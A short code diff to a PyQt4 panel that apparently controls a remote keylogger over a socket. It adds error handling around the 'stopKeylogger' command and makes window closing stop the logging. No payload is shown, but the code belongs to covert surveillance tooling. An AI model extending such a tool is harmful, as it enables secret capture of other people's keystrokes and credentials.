@@ -3,6 +3,7 @@ from PyQt4.QtCore import *
 
 from ast import literal_eval
 import os
+import socket
 
 from main_ui import Ui_Form
 
@@ -71,9 +72,14 @@ class mainPopup(QWidget, Ui_Form):
             self.convert_smilies()
         except AttributeError:
             pass
+        except socket.error:
+            self.stop_logging()
 
     def stop_logging(self):
-        data = get(self.sock, 'stopKeylogger', 'keyloggerstop')
+        try:
+            data = get(self.sock, 'stopKeylogger', 'keyloggerstop')
+        except:
+            return
         self.stopKeyloggingButton.setDisabled(True)
         self.startKeyloggingButton.setDisabled(False)
         try:
@@ -91,6 +97,6 @@ class mainPopup(QWidget, Ui_Form):
 
     def closeEvent(self, event):
         try:
-            self.stop_desktop()
+            self.stop_logging()
         except AttributeError:
             pass
